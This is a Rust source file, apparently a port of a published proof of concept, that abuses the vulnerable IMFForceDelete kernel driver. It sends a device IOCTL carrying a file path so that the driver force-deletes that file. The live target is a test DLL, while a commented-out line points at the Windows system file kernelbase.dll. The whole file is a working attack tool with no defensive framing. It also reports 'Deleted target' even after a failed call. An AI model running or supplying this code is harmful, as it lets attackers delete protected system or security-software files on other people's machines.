/*
    IMFForceDelete driver in Rust
    Author: 5mukx

    Source: @vxunderground and @_mmpte_software
        Link: https://gist.github.com/alfarom256/f1342f14dc6a742de7ea4004a1b6d7ed
*/

use std::ptr::null_mut;
use std::ffi::CString;

use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE};

// const DUMMY_FILE: &str = r"\\??\C:\Windows\System32\kernelbase.dll";
const DUMMY_FILE: &str = r"\\??\C:\Program Files (x86)\Google\test.dll";

const DEVICE_NAME: &str = r"\\.\IMFForceDelete123";
const IOCTL_CODE: u32 = 0x8016E000;

fn main(){
    let mut dw_return_val: u32 = 0;
    let mut dw_bytes_returned: u32 = 0;

    let cstr_device_name = CString::new(DEVICE_NAME).expect("Failed to convert device name to CString");
    
    unsafe{
        let h_device = CreateFileA(
            cstr_device_name.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
            eprintln!("Failed to open handle to device. Error code: {}", GetLastError());
            return;
        }

        println!("Opened handle to device");

        let dummy_file: Vec<u16> = DUMMY_FILE.encode_utf16().chain(Some(0)).collect(); // Null-terminated wchar_t

        let b_res = DeviceIoControl(
            h_device,
            IOCTL_CODE,
            dummy_file.as_ptr() as *mut _,
            (dummy_file.len() * std::mem::size_of::<u16>()) as u32,
            &mut dw_return_val as *mut _ as *mut _,
            std::mem::size_of::<u32>() as u32,
            &mut dw_bytes_returned,
            null_mut(),
        );

        if b_res == 0 || dw_return_val == 0 {
            println!("Delete failed");
            CloseHandle(h_device);
            eprintln!("Error code: {}", GetLastError());
        }

        println!("Deleted target");
        CloseHandle(h_device);
    }
}
